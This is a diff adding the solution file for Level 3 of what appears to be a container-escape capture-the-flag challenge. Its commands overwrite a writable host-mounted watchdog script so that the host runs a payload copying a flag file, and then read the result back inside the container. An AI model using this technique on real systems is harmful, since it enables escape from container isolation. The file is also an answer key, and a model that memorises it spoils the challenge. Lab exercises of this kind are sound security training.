@@ -1,0 +1,12 @@
+SOLUTION — Level 3: Writable Host-Mounted Script
+
+# Overwrite the watchdog script with your payload
+# Output must go to a path accessible from inside the container
+printf '#!/bin/sh\ncat /flags/level3 > /opt/escapepod/scripts/output\n' \
+  > /host-scripts/watchdog.sh
+
+# Wait up to 30 seconds for execution
+sleep 30
+
+# Read the flag
+cat /host-scripts/output
